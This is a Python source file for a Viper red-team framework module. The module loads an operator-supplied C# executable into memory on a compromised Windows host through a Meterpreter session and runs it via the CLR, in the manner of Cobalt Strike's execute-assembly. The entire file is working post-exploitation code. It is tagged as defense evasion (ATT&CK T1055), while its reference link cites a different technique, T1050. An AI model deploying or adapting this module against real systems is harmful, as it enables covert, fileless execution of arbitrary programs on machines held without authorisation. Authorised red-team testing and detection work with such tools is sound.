# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import base64

from PostModule.module import *


class PostModule(PostMSFRawModule):
    NAME = "内存执行C#可执行文件"
    DESC = "模块将C#编写的exe文件加载到内存中,然后使用CLR执行.\n" \
           "需要已控主机安装.net2.0（win2008默认安装）或.net4.0（win2012默认安装）.\n" \
           "可执行文件需要与已控主机.net版本相同.\n" \
           "功能类似CS的execute-assembly,当C#需要输入参数时需要确保填写参数."
    MODULETYPE = TAG2CH.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['exe', 'EXE']),
        OptionStr(name='ARGUMENTS', name_tag="命令行参数", option_length=24, desc="运行exe时输入的参数"),
        OptionIntger(name='WAIT', name_tag="等待时间", desc="读取输出前等待时间", default=10),
        OptionBool(name='KILL', name_tag="结束进程", desc="执行完成后结束C#进程", default=True),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/manage/execute_assembly_api"

    def check(self):
        """执行前的检查函数"""
        from PostModule.lib.Session import Session
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter"

        exe_file = self.get_option_filename()
        if exe_file is None:
            return False, "请选择执行exe文件,文件后缀必须为exe"
        else:
            self.set_option(key='ASSEMBLY', value=exe_file)

        arguments = self.param("ARGUMENTS")
        self.set_option(key='ARGUMENTS', value=arguments)

        wait = self.param("WAIT")
        self.set_option(key='WAIT', value=wait)
        kill = self.param("KILL")
        self.set_option(key='KILL', value=kill)
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败,失败原因:{}".format(message))
        else:
            assembly_out = base64.b64decode(data).decode('utf-8', errors="ignore")
            if assembly_out is None or len(assembly_out) == 0:
                self.log_warning("exe文件未输出信息")
                if self.param("ARGUMENTS") is None or len(self.param("ARGUMENTS")) == 0:
                    self.log_warning("如果exe程序接受参数输入，请尝试输入参数")
            else:
                self.log_good("exe执行完成,输出信息:")
                try:

                    self.log_raw(base64.b64decode(data).decode('utf-8', errors="ignore"))
                except Exception as E:
                    print(E)
                    self.log_raw(data)
